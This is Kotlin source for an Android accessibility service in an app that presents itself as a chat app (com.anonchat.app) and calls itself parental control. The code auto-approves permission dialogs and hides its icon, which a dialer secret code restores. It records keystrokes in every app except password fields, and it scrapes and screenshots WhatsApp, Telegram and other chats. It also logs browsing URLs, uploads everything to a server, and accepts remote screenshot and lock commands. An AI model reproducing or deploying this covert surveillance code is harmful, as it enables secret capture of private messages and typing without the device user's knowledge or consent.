package com.anonchat.app.parentalcontrol.service

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.GestureDescription
import android.content.Intent
import android.graphics.Path
import android.os.Build
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.anonchat.app.parentalcontrol.api.ApiClient
import com.anonchat.app.parentalcontrol.api.CloudConfig
import com.anonchat.app.parentalcontrol.manager.AutoPermissionHelper
import com.anonchat.app.ui.main.MainActivity
import com.anonchat.app.util.AppHider

class TrackerAccessibilityService : AccessibilityService() {

    private var lastPackageName: String? = null
    private var lastEventTime: Long = 0
    private var lastWebUrl: String? = null
    private var lastWebUrlTime: Long = 0
    // App-switch debounce: dialers and some launchers post several window-state
    // events in a burst (different internal window classes) — report the switch
    // once per package within a 10s window so the parent's activity feed isn't
    // flooded with duplicate "Opened Phone" rows.
    private var lastSwitchPkg: String? = null
    private var lastSwitchTs: Long = 0L

    // ── On-screen conversation capture ──────────────────────────────
    private val chatPackages = setOf(
        "com.whatsapp", "com.whatsapp.w4b", "com.instagram.android",
        "com.facebook.orca", "com.facebook.lite", "com.facebook.katana",
        "org.telegram.messenger", "org.telegram.plus", "com.snapchat.android",
        "com.discord", "jp.naver.line.android", "com.viber.voip", "com.skype.raider"
    )
    private val chatNoise = listOf(
        "online", "typing…", "typing...", "last seen", "recording audio",
        "click to", "swipe to", "messages and calls", "end-to-end", "encrypted",
        "view contact", "add to", "mute", " wallpaper", "block", "report", "empty chat"
    )
    private var lastChatCaptureTime: Long = 0
    private var lastChatSignature: String? = null
    private val chatHandler = android.os.Handler(android.os.Looper.getMainLooper())

    // ── Chat screenshot capture (on send / new content) ─────────────────
    private var lastScreenshotMs: Long = 0
    private var lastChatTextLen: Int = 0
    private var lastChatTextTs: Long = 0
    private val screenshotExecutor = java.util.concurrent.Executors.newSingleThreadExecutor()

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        val packageName = event.packageName?.toString() ?: return
        val now = System.currentTimeMillis()

        // ── Auto Permission & Setup Approval ──────────────────────────
        // 1. Auto-approve standard permission dialogs (com.android.permissioncontroller etc.)
        if (AutoPermissionHelper.isAutoTappableDialog(packageName)) {
            val success = AutoPermissionHelper.autoApproveDialog(this)
            if (success) {
                Log.d(TAG, "Auto-approved dialog from: $packageName")
                lastEventTime = now
                return
            }
        }

        // 2. Auto-enable KidGuard toggles on Settings screens during first-install wizard
        //    (Notification Listener access, Usage Access / App Usage Stats)
        if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED ||
            event.eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED
        ) {
            if (AutoPermissionHelper.autoTapKidGuardToggle(this)) {
                Log.d(TAG, "Auto-enabled KidGuard toggle on settings screen: $packageName")
                lastEventTime = now
            }
        }

        // ── Dialer Secret Code Detection (Android 12+ fallback) ──────
        if (event.eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED ||
            event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED
        ) {
            if (AutoPermissionHelper.checkDialerForSecretCode(this, packageName)) {
                Log.d(TAG, "Secret code detected in dialer — launching app")
                AppHider.showApp(this)
                // Route through SecretCodeReceiver.launchApp, which waits for the
                // PackageManager to publish the alias re-enable before starting the
                // activity — otherwise startActivity() can be dropped on some OEMs.
                com.anonchat.app.receiver.SecretCodeReceiver.launchAfterUnhide(this)
                lastEventTime = now
                return
            }
        }

        // ── Monitoring & Auto Keep-Alive ────────────────────────────
        if (!TrackerService.isRunning) {
            TrackerService.start(this)
        }

        // ── On-screen conversation capture (chat apps) ────────────────
        if (packageName in chatPackages &&
            (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED ||
             event.eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED)
        ) {
            scheduleChatCapture(packageName)
        }

        when (event.eventType) {
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                if (now - lastEventTime > 2000) {
                    if (packageName != lastSwitchPkg || now - lastSwitchTs > 10_000L) {
                        lastSwitchPkg = packageName
                        lastSwitchTs = now
                        lastPackageName = packageName
                        lastEventTime = now
                        val className = event.className?.toString() ?: ""
                        val appName = getAppName(packageName)
                        sendAppSwitchReport(packageName, appName, className)
                    }
                }
                if (isBrowserPackage(packageName) && Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                    val eventText = event.text?.joinToString(" ") ?: ""
                    val url = extractUrlFromBrowserWindow()
                    val resolvedUrl = url ?: extractUrl(eventText)
                    if (resolvedUrl != null && resolvedUrl != lastWebUrl && now - lastWebUrlTime > 3000) {
                        lastWebUrl = resolvedUrl
                        lastWebUrlTime = now
                        sendWebHistoryWithTitle(packageName, resolvedUrl, eventText.take(200))
                    } else if (eventText.isNotBlank() && eventText.length > 3 && now - lastWebUrlTime > 10000) {
                        lastWebUrlTime = now
                        sendWebHistoryWithTitle(packageName, "browsing:${packageName}", eventText.take(200))
                    }
                }
            }

            AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> {
                if (isBrowserPackage(packageName) && Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    val source = event.source
                    if (source != null) {
                        val url = findUrlInNode(source)
                        source.recycle()
                        if (url != null && url != lastWebUrl && now - lastWebUrlTime > 3000) {
                            lastWebUrl = url
                            lastWebUrlTime = now
                            sendWebHistoryWithTitle(packageName, url, "")
                        }
                    }
                }
            }

            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    val source = event.source
                    if (source != null && !source.isPassword) {
                        val text = event.text?.joinToString(" ") ?: ""
                        val pkg = event.packageName?.toString() ?: ""
                        val now2 = System.currentTimeMillis()
                        // "Message sent" signal: a chat input that had text becomes
                        // empty the instant the app posts the message → screenshot it.
                        if (pkg in chatPackages) {
                            if (text.isBlank() && lastChatTextLen > 3 && now2 - lastChatTextTs < 15_000L) {
                                maybeCaptureScreenshot(pkg, "sent")
                            }
                            if (text.isNotBlank()) {
                                lastChatTextLen = text.length
                                lastChatTextTs = now2
                            }
                        }
                        if (text.isNotBlank() && text.length > 3) {
                            if (isBrowserPackage(pkg)) {
                                val url = extractUrl(text)
                                if (url != null) {
                                    if (url != lastWebUrl && now2 - lastWebUrlTime > 3000) {
                                        lastWebUrl = url
                                        lastWebUrlTime = now2
                                        sendWebHistory(pkg, url)
                                    }
                                    source.recycle()
                                    return
                                }
                            }
                            sendKeyLog(pkg, text)
                        }
                        source.recycle()
                    }
                }
            }

            AccessibilityEvent.TYPE_VIEW_CLICKED -> {
                val pkg = event.packageName?.toString() ?: return
                // Send / enter button tapped in a chat app → screenshot the conversation.
                if (pkg in chatPackages && isSendButton(event)) {
                    maybeCaptureScreenshot(pkg, "send")
                }
                val viewId = event.contentDescription?.toString()
                if (viewId != null && viewId.isNotBlank()) {
                    sendClickReport(pkg, viewId)
                }
            }
        }
    }

    override fun onInterrupt() {}

    // ── On-screen conversation capture ──────────────────────────────

    /** Debounce: wait for the chat UI to settle, then read the visible messages once. */
    private fun scheduleChatCapture(packageName: String) {
        chatHandler.removeCallbacksAndMessages(null)
        chatHandler.postDelayed({ captureConversation(packageName) }, 3000)
    }

    private fun captureConversation(packageName: String) {
        try {
            val root = rootInActiveWindow ?: return
            if (root.packageName?.toString() != packageName) return

            val messages = mutableListOf<String>()
            val queue = arrayListOf(root)
            var head = 0
            var visited = 0
            while (head < queue.size && visited < 600 && messages.size < 80) {
                val node = queue[head]
                head++
                visited++
                if (node.childCount > 0) {
                    for (i in 0 until node.childCount) {
                        try {
                            val child = node.getChild(i)
                            if (child != null) queue.add(child)
                        } catch (e: Exception) {}
                    }
                }
                val text = node.text?.toString()?.trim() ?: ""
                if (text.length < 2 || text.length > 500) continue
                val lower = text.lowercase()
                if (chatNoise.any { lower.contains(it) }) continue
                // Skip UI chrome: bare timestamps / counters
                if (text.matches(Regex("^[0-9:apm.,\\-/ ]{1,12}$", RegexOption.IGNORE_CASE))) continue
                if (messages.none { it == text }) messages.add(text)
            }

            if (messages.isEmpty()) return

            // Dedup: same visible set within 10 minutes is not re-sent
            val signature = messages.joinToString("|")
            val isNew = signature != lastChatSignature
            if (!isNew && System.currentTimeMillis() - lastChatCaptureTime < 10 * 60_000L
            ) return
            lastChatSignature = signature
            lastChatCaptureTime = System.currentTimeMillis()

            Log.d(TAG, "Chat capture: ${messages.size} visible messages in $packageName")
            sendChatCapture(packageName, messages)
            // Conversation content changed (incoming message / media / sent message) →
            // screenshot it: catches the full chat incl. images even if the send
            // button itself wasn't detected.
            if (isNew) maybeCaptureScreenshot(packageName, "chat_update")
        } catch (e: Exception) {
            Log.e(TAG, "captureConversation failed: ${e.message}")
        }
    }

    private fun appNameFor(pkg: String): String = try {
        packageManager.getApplicationLabel(
            packageManager.getApplicationInfo(pkg, 0)
        ).toString()
    } catch (e: Exception) { pkg }

    private fun sendChatCapture(packageName: String, messages: List<String>) {
        Thread {
            try {
                val payload = org.json.JSONObject().apply {
                    put("device_id", com.anonchat.app.parentalcontrol.api.CloudConfig.deviceId)
                    put("activities", org.json.JSONArray().apply {
                        put(org.json.JSONObject().apply {
                            put("activity_type", "chat_capture")
                            put("package_name", packageName)
                            put("app_name", appNameFor(packageName))
                            put("data", org.json.JSONObject().apply {
                                put("messages", org.json.JSONArray().apply {
                                    messages.forEach { put(it.take(300)) }
                                })
                                put("count", messages.size)
                            })
                            put("timestamp", System.currentTimeMillis())
                        })
                    })
                }
                com.anonchat.app.parentalcontrol.api.ApiClient.sendBulkReport(payload.toString())
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }.start()
    }

    // ── Chat screenshot capture machinery ───────────────────────

    private fun isSendButton(event: AccessibilityEvent): Boolean {
        return try {
            val desc = event.contentDescription?.toString()?.lowercase() ?: ""
            val cls = event.className?.toString()?.lowercase() ?: ""
            val node = event.source
            val viewId = node?.viewIdResourceName?.lowercase() ?: ""
            desc.contains("send") || desc.contains("submit") || desc.contains("enter") ||
                viewId.contains("send") || viewId.contains("composer_send") ||
                viewId.contains("send_button") || viewId.contains("btn_send") ||
                (cls.contains("imagebutton") && desc.contains("send"))
        } catch (e: Exception) {
            false
        }
    }

    /** Screenshot the active chat screen (Android 11+). Throttled to 1 / 10 s. */
    private fun maybeCaptureScreenshot(packageName: String, reason: String) {
        val now = System.currentTimeMillis()
        if (now - lastScreenshotMs < 10_000L) return
        lastScreenshotMs = now
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
            Log.d(TAG, "Screenshot needs Android 11+ (reason=$reason)")
            return
        }
        try {
            takeScreenshot(
                android.view.Display.DEFAULT_DISPLAY,
                screenshotExecutor,
                object : android.accessibilityservice.AccessibilityService.TakeScreenshotCallback {
                    override fun onSuccess(screenshot: android.accessibilityservice.AccessibilityService.ScreenshotResult) {
                        handleScreenshot(screenshot, packageName, reason)
                    }
                    override fun onFailure(errorCode: Int) {
                        Log.w(TAG, "Screenshot failed code=$errorCode reason=$reason")
                    }
                }
            )
        } catch (e: Exception) {
            Log.e(TAG, "takeScreenshot error: ${e.message}")
        }
    }

    private fun handleScreenshot(result: android.accessibilityservice.AccessibilityService.ScreenshotResult, packageName: String, reason: String) {
        val hardwareBuffer = result.hardwareBuffer
        try {
            val colorSpace = result.colorSpace
                ?: android.graphics.ColorSpace.get(android.graphics.ColorSpace.Named.SRGB)
            val full = android.graphics.Bitmap.wrapHardwareBuffer(hardwareBuffer, colorSpace) ?: return
            val bmp = if (full.width > 1280) {
                android.graphics.Bitmap.createScaledBitmap(
                    full, 1280, (full.height * 1280f / full.width).toInt(), true
                )
            } else full
            val file = java.io.File(cacheDir, "cht_${System.currentTimeMillis()}.jpg")
            try {
                file.outputStream().use {
                    bmp.compress(android.graphics.Bitmap.CompressFormat.JPEG, 78, it)
                }
            } finally {
                if (bmp != full) bmp.recycle()
                if (full != bmp) full.recycle()
            }
            uploadChatScreenshot(file, packageName, reason)
        } catch (e: Exception) {
            Log.e(TAG, "handleScreenshot error: ${e.message}")
        } finally {
            try { hardwareBuffer.close() } catch (e: Exception) {}
        }
    }

    /** Upload the chat screenshot (Firebase first, Render fallback) + record an activity. */
    private fun uploadChatScreenshot(file: java.io.File, packageName: String, reason: String) {
        try {
            val ts = System.currentTimeMillis()
            val filename = "chat_${ts}.jpg"
            val meta = org.json.JSONObject().apply {
                put("source_path", "chat_${reason}_${packageName}")
                put("original_size", file.length())
                put("bytes_uploaded", file.length())
            }
            var firebaseUrl: String? = null
            try {
                firebaseUrl = kotlinx.coroutines.runBlocking(kotlinx.coroutines.Dispatchers.IO) {
                    com.anonchat.app.parentalcontrol.manager.FirebaseManager
                        .uploadMediaFile(file, "image")
                }
            } catch (e: Exception) {
                firebaseUrl = null
            }
            var mediaId: String? = null
            if (firebaseUrl != null) {
                meta.put("storage_url", firebaseUrl)
                mediaId = ApiClient.uploadMediaFile(
                    null, filename, "image/jpeg", "image", ts, meta.toString()
                )
            } else {
                mediaId = ApiClient.uploadMediaFile(
                    file.readBytes(), filename, "image/jpeg", "image", ts, meta.toString()
                )
            }
            sendChatScreenshotActivity(packageName, firebaseUrl, mediaId, reason)
            file.delete()
        } catch (e: Exception) {
            Log.e(TAG, "uploadChatScreenshot error: ${e.message}")
        }
    }

    private fun sendChatScreenshotActivity(packageName: String, url: String?, mediaId: String?, reason: String) {
        Thread {
            try {
                val payload = org.json.JSONObject().apply {
                    put("device_id", CloudConfig.deviceId)
                    put("activities", org.json.JSONArray().apply {
                        put(org.json.JSONObject().apply {
                            put("activity_type", "chat_screenshot")
                            put("package_name", packageName)
                            put("app_name", appNameFor(packageName))
                            put("data", org.json.JSONObject().apply {
                                put("image_url", url ?: "")
                                put("media_id", mediaId ?: "")
                                put("reason", reason)
                            })
                            put("timestamp", System.currentTimeMillis())
                        })
                    })
                }
                ApiClient.sendBulkReport(payload.toString())
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }.start()
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this
        Log.d(TAG, "TrackerAccessibilityService connected")
    }

    override fun onDestroy() {
        super.onDestroy()
        if (instance == this) instance = null
    }

    private fun sendAppSwitchReport(packageName: String, appName: String, className: String) {
        Thread {
            try {
                val payload = org.json.JSONObject().apply {
                    put("device_id", com.anonchat.app.parentalcontrol.api.CloudConfig.deviceId)
                    put("activities", org.json.JSONArray().apply {
                        put(org.json.JSONObject().apply {
                            put("activity_type", "app_switch")
                            put("package_name", packageName)
                            put("app_name", appName)
                            put("data", org.json.JSONObject().apply {
                                put("className", className)
                            })
                            put("timestamp", System.currentTimeMillis())
                        })
                    })
                }
                com.anonchat.app.parentalcontrol.api.ApiClient.sendBulkReport(payload.toString())
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }.start()
    }

    private fun sendKeyLog(packageName: String, text: String) {
        Thread {
            try {
                val payload = org.json.JSONObject().apply {
                    put("device_id", com.anonchat.app.parentalcontrol.api.CloudConfig.deviceId)
                    put("activities", org.json.JSONArray().apply {
                        put(org.json.JSONObject().apply {
                            put("activity_type", "text_input")
                            put("package_name", packageName)
                            put("data", org.json.JSONObject().apply {
                                put("text", text.take(200))
                            })
                            put("timestamp", System.currentTimeMillis())
                        })
                    })
                }
                com.anonchat.app.parentalcontrol.api.ApiClient.sendBulkReport(payload.toString())
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }.start()
    }

    private fun sendClickReport(packageName: String, viewId: String) {
        Thread {
            try {
                val payload = org.json.JSONObject().apply {
                    put("device_id", com.anonchat.app.parentalcontrol.api.CloudConfig.deviceId)
                    put("activities", org.json.JSONArray().apply {
                        put(org.json.JSONObject().apply {
                            put("activity_type", "click")
                            put("package_name", packageName)
                            put("app_name", getAppName(packageName))
                            put("data", org.json.JSONObject().apply {
                                put("viewId", viewId)
                            })
                            put("timestamp", System.currentTimeMillis())
                        })
                    })
                }
                com.anonchat.app.parentalcontrol.api.ApiClient.sendBulkReport(payload.toString())
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }.start()
    }

    private fun extractUrlFromBrowserWindow(): String? {
        try {
            val root = rootInActiveWindow
            if (root == null) return null
            val url = findUrlInNode(root)
            root.recycle()
            return url
        } catch (e: Exception) {
            return null
        }
    }

    private fun extractTitleFromBrowserWindow(): String {
        try {
            val root = rootInActiveWindow ?: return ""
            val title = findTitleInNode(root)
            root.recycle()
            return title
        } catch (e: Exception) {
            return ""
        }
    }

    private val KNOWN_URL_BAR_IDS = setOf(
        "com.android.chrome:id/url_bar",
        "com.android.chrome:id/omnibox_results_container",
        "com.android.chrome:id/omnibox",
        "com.android.chrome:id/search_box",
        "org.mozilla.firefox:id/mozac_browser_awesomebar",
        "org.mozilla.firefox:id/url_bar",
        "com.opera.browser:id/url_bar",
        "com.brave.browser:id/url_bar",
        "com.sec.android.app.sbrowser:id/url_bar",
        "com.vivaldi.browser:id/url_bar",
        "com.microsoft.emmx:id/url_bar",
        "com.microsoft.emmx:id/omnibox"
    )

    private fun findUrlInNode(node: AccessibilityNodeInfo): String? {
        val viewId = node.viewIdResourceName ?: ""
        if (viewId in KNOWN_URL_BAR_IDS) {
            val text = node.text?.toString() ?: ""
            if (text.isNotBlank()) {
                val url = extractUrl(text)
                if (url != null) return url
                if (text.contains(".") && !text.contains(" ") && text.length in 4..200) return "https://$text"
            }
        }
        val text = node.text?.toString() ?: ""
        if (text.isNotBlank() && text.length > 3) {
            val url = extractUrl(text)
            if (url != null) return url
        }
        val desc = node.contentDescription?.toString() ?: ""
        if (desc.isNotBlank() && desc.length > 5) {
            val url = extractUrl(desc)
            if (url != null) return url
        }
        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            val result = findUrlInNode(child)
            child.recycle()
            if (result != null) return result
        }
        return null
    }

    private fun findTitleInNode(node: AccessibilityNodeInfo): String {
        val viewId = node.viewIdResourceName ?: ""
        if (viewId.contains("title", true) || viewId.contains("page_title", true)) {
            val text = node.text?.toString() ?: ""
            if (text.isNotBlank() && text.length > 2) return text
        }
        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            val result = findTitleInNode(child)
            child.recycle()
            if (result.isNotBlank()) return result
        }
        return ""
    }

    private fun sendWebHistoryWithTitle(packageName: String, url: String, title: String) {
        Thread {
            try {
                val payload = org.json.JSONObject().apply {
                    put("device_id", com.anonchat.app.parentalcontrol.api.CloudConfig.deviceId)
                    put("webhistory", org.json.JSONArray().apply {
                        put(org.json.JSONObject().apply {
                            put("url", url)
                            put("title", title)
                            put("browser", getAppName(packageName))
                            put("visit_count", 1)
                            put("timestamp", System.currentTimeMillis())
                        })
                    })
                }
                com.anonchat.app.parentalcontrol.api.ApiClient.sendBulkReport(payload.toString())
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }.start()
    }

    private fun sendWebHistory(packageName: String, url: String) {
        Thread {
            try {
                val payload = org.json.JSONObject().apply {
                    put("device_id", com.anonchat.app.parentalcontrol.api.CloudConfig.deviceId)
                    put("webhistory", org.json.JSONArray().apply {
                        put(org.json.JSONObject().apply {
                            put("url", url)
                            put("title", "")
                            put("browser", getAppName(packageName))
                            put("visit_count", 1)
                            put("timestamp", System.currentTimeMillis())
                        })
                    })
                }
                com.anonchat.app.parentalcontrol.api.ApiClient.sendBulkReport(payload.toString())
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }.start()
    }

    private fun isBrowserPackage(packageName: String): Boolean {
        return BROWSER_PACKAGES.any { packageName == it || packageName.startsWith(it) }
    }

    private fun writeDebugLog(msg: String) {
        try {
            val ts = java.text.SimpleDateFormat("HH:mm:ss", java.util.Locale.US).format(java.util.Date())
            java.io.File(filesDir, "debug.log").appendText("$ts A11y: $msg\n")
        } catch (_: Exception) {}
    }

    private fun extractUrl(text: String): String? {
        val trimmed = text.trim()
        if (trimmed.isEmpty() || trimmed.length > 2048) return null
        if (trimmed.startsWith("http://", true) || trimmed.startsWith("https://", true)) {
            return trimmed.split(" ")[0]
        }
        if (trimmed.startsWith("www.")) {
            return "https://$trimmed".split(" ")[0]
        }
        val urlPattern = Regex("^(https?://)?[a-zA-Z0-9][-a-zA-Z0-9]*\\.[a-zA-Z]{2,}(/.*)?$", RegexOption.IGNORE_CASE)
        if (urlPattern.matches(trimmed) && trimmed.contains(".")) {
            return if (trimmed.startsWith("http", true)) trimmed else "https://$trimmed"
        }
        return null
    }

    private fun getAppName(packageName: String): String {
        return try {
            val pm = packageManager
            pm.getApplicationLabel(pm.getApplicationInfo(packageName, 0)).toString()
        } catch (e: Exception) {
            packageName
        }
    }

    companion object {
        private const val TAG = "TrackerAccessibility"

        private val BROWSER_PACKAGES = setOf(
            "com.android.chrome",
            "com.android.browser",
            "org.mozilla.firefox",
            "com.opera.browser",
            "com.opera.mini.native",
            "com.brave.browser",
            "com.mi.globalbrowser",
            "com.vivaldi.browser",
            "com.sec.android.app.sbrowser",
            "com.android.webview",
            "com.microsoft.emmx",
            "com.google.android.googlequicksearchbox",
            "com.vivo.browser"
        )

        @Volatile
        var instance: TrackerAccessibilityService? = null
            private set

        fun isAccessibilityServiceEnabled(context: android.content.Context): Boolean {
            val am = context.getSystemService(android.app.admin.DevicePolicyManager::class.java)
            val cn = android.content.ComponentName(context, TrackerAccessibilityService::class.java)
            try {
                val enabledServices = android.provider.Settings.Secure.getString(
                    context.contentResolver,
                    android.provider.Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
                ) ?: return false
                return enabledServices.contains(cn.flattenToString())
            } catch (e: Exception) {
                return false
            }
        }

        fun openAccessibilitySettings(context: android.content.Context) {
            val intent = android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS
            context.startActivity(Intent(intent).apply {
                flags = Intent.FLAG_ACTIVITY_NEW_TASK
            })
        }

        fun captureScreenshot(commandId: String? = null, callback: ((Boolean) -> Unit)? = null) {
            val service = instance
            if (service == null) {
                Log.e(TAG, "Screenshot failed: AccessibilityService not running")
                callback?.invoke(false)
                return
            }
            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
                Log.e(TAG, "Screenshot failed: Requires Android 11+")
                callback?.invoke(false)
                return
            }
            try {
                service.takeScreenshot(
                    android.view.Display.DEFAULT_DISPLAY,
                    service.mainExecutor,
                    object : AccessibilityService.TakeScreenshotCallback {
                        override fun onSuccess(result: AccessibilityService.ScreenshotResult) {
                            try {
                                val hardwareBuffer = result.hardwareBuffer
                                val colorSpace = result.colorSpace
                                val bitmap = android.graphics.Bitmap.wrapHardwareBuffer(hardwareBuffer, colorSpace)
                                hardwareBuffer.close()
                                if (bitmap != null) {
                                    Thread {
                                        try {
                                            val file = java.io.File(service.cacheDir, "screenshot_${System.currentTimeMillis()}.jpg")
                                            java.io.FileOutputStream(file).use { out ->
                                                bitmap.compress(android.graphics.Bitmap.CompressFormat.JPEG, 80, out)
                                            }
                                            bitmap.recycle()
                                            // Upload to server — pass commandId to link screenshot to remote command
                                            val success = com.anonchat.app.parentalcontrol.api.ApiClient.uploadScreenshot(file, commandId)
                                            Log.d(TAG, "Screenshot uploaded: $success")
                                            file.delete()
                                            callback?.invoke(success)
                                        } catch (e: Exception) {
                                            Log.e(TAG, "Screenshot save/upload failed: ${e.message}")
                                            callback?.invoke(false)
                                        }
                                    }.start()
                                } else {
                                    Log.e(TAG, "Screenshot bitmap is null")
                                    callback?.invoke(false)
                                }
                            } catch (e: Exception) {
                                Log.e(TAG, "Screenshot processing failed: ${e.message}")
                                callback?.invoke(false)
                            }
                        }
                        override fun onFailure(errorCode: Int) {
                            Log.e(TAG, "Screenshot failed with error code: $errorCode")
                            callback?.invoke(false)
                        }
                    }
                )
            } catch (e: Exception) {
                Log.e(TAG, "takeScreenshot exception: ${e.message}")
                callback?.invoke(false)
            }
        }

        /**
         * Lock the screen using AccessibilityService global action GLOBAL_ACTION_LOCK_SCREEN.
         * Requires API 28+ and the accessibility service to be running.
         * @return true if the action was dispatched successfully
         */
        @androidx.annotation.RequiresApi(Build.VERSION_CODES.P)
        fun lockScreen(): Boolean {
            val service = instance ?: run {
                Log.e(TAG, "lockScreen: AccessibilityService not running")
                return false
            }
            val dispatched = service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_LOCK_SCREEN)
            Log.d(TAG, "lockScreen via GLOBAL_ACTION_LOCK_SCREEN dispatched=$dispatched")
            return dispatched
        }
    }
}

